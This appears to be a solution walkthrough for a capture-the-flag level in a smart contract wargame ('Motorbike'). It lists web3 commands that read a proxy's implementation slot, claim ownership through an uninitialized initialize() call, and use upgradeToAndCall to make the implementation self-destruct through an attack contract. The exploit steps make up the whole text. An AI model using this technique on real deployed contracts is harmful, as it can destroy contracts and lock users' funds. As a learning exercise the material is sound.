

1) Get implementation contract from storage slot

     await web3.eth.getStorageAt(instance, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
     --> '0x0000000000000000000000005bbac8bb93aa6bc4e6b32f39c61c54abde055899'

     Get rightmost 40 bytes



2) Call initialize function on implementation contract since it was not called during deployment of proxy

    functionSig = web3.eth.abi.encodeFunctionSignature('initialize()')
    --> '0x8129fc1c'

    sendTransaction({from: player, to: "0x5BbAC8BB93aA6bc4e6b32f39C61C54ABDe055899", data: '0x8129fc1c'})




3) Deploy an attack contract with a destroy function that executes selfdestruct

    web3.eth.abi.encodeFunctionSignature('destroy()')
    --> '0x83197ef0'


    [see Motorbike.sol]



4) Call upgradeToAndCall on implementation contract, which makes a delegate call to attack contract and selfdestructs

    functionSig = web3.eth.abi.encodeFunctionCall({
    name: 'upgradeToAndCall', 
    type: 'function', 
    inputs: 
    [{
        type: 'address', name: 'newImplementation'
        }, 
        {
            type: 'bytes', name: 'data'
        }
    ]}, ['0x16Ecaa004B5Ca5634386dEdfa2D5718b3282f0B5','0x83197ef0'])



    ----------------------------------------------------------------


    sendTransaction({from: player, to: "0x5BbAC8BB93aA6bc4e6b32f39C61C54ABDe055899", data: functionSig})


